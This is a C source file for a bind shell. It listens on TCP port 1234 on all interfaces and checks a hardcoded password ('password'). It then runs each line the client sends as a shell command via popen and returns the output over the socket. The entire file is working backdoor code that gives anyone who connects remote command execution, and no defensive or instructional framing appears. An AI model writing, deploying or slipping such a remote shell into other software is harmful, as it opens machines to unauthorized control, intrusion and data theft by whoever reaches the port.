#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#define shell_port 1234 // port that is going to be used

int connected = 0, loop, acceptedSocket;

// exception handling on broken connection pipe
void broken_pipe(int signum)
{
	printf("broken socket pipe\n");
	connected = 0;
	loop = 0;
	if (acceptedSocket) close(acceptedSocket);
}

int main(int argc, char *argv[])
{
	int listeningSocket;
	socklen_t clilen;
	char buffer[1024], buffer2[1024];
	char* cmdOutput;
	struct sockaddr_in serv_addr, cli_addr;
	FILE *outputStream;
	size_t cmdRead;
	size_t cmdMalloc = 1024;
	size_t cmdLen   = 0;

	// socket creation process
	listeningSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (listeningSocket < 0) { 
		printf("error on creating socket\n");
		exit(0);
	} else
		printf("socket created\n");

	// ip_address and port treatment
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = INADDR_ANY;
	serv_addr.sin_port = htons(shell_port);

	// socket binding process
	if (bind(listeningSocket, (struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0) {
		printf("error on binding\n");
		exit(0);
	} else {
		printf("socket binded\n");

     		clilen = sizeof(cli_addr);
		
		// listening for incoming conections on portno
		printf("listening on port %d\n", shell_port);
     		listen(listeningSocket, 5);

		while(1) {
                	
			// exception handling on function sig_pipe
			signal(SIGPIPE, broken_pipe);

			// acceptance of incoming connection 
     			acceptedSocket = accept(listeningSocket,(struct sockaddr *) &cli_addr, &clilen);
     			if (acceptedSocket < 0) {

          			printf("error on accepting new socket connection\n");

			} else {

				printf("new socket connection accepted\n");
				connected = 1;

				// athentication of connected client
				while(connected) {
					
					memset(buffer, '\0',1024);
	
					if (read(acceptedSocket,buffer,1024) < 0) printf("error on reading socket to validate client");

					else {
						// password used by client
						if(strncmp(buffer, "password\n", 9) == 0) {
							printf("user authenticated\n");
							write(acceptedSocket, "authenticated\n", 14);
							loop = 1;
							break;
						} else {
							printf("authentication failure with password: %s\n", buffer);
							write(acceptedSocket, "authentication failure\n", 22);
							loop = 0;
							break;
						}	
					}
				}

				// info trading loop
     				while (loop) {

     					cmdOutput = malloc(cmdMalloc);

					memset(buffer,'\0',1024);
					memset(buffer2, '\0',1024);
					memset(cmdOutput, '\0',1024);

					// receiving data
     					if (read(acceptedSocket,buffer,1024) < 0) printf("error when reading from socket\n");
     					else {
						printf("cmd received: %s\n",buffer);
						
						// end connection case, when user digits quit
						if (strncmp(buffer, "quit\n", 5) == 0) {
							loop = 0;
							connected = 0;
							printf("user disconnected\n");
							write(acceptedSocket,"disconnected\n", 13);

						} else {
							// command execution on shell
    							outputStream = popen(buffer, "r");
							cmdLen = 0;
						
							// read from command return
   							while ((cmdRead = fread(buffer2, 1, sizeof(buffer2), outputStream)) != 0) {
        							if (cmdLen + cmdRead >= cmdMalloc) {
           								cmdMalloc *= 2;
            								cmdOutput = realloc(cmdOutput, cmdMalloc);
        							}
        							memmove(cmdOutput + cmdLen, buffer2, cmdRead);
        							cmdLen += cmdRead;
    							}
    							
							// output through socket from response
							if (cmdLen == 0) {
								fwrite("no output\n", 1, 10, stdout);
								write(acceptedSocket,"no output\n",10);
							} else {
								fwrite(cmdOutput, 1, cmdLen, stdout);
								if (write(acceptedSocket,cmdOutput,cmdLen) < 0) printf("error on writing to socket\n"); 

							}
   							pclose(outputStream);
							free(cmdOutput);
						}
					}	
     				}
        		}
     			close(acceptedSocket);
     		}
	}
	close(listeningSocket);
	return 0; 
}
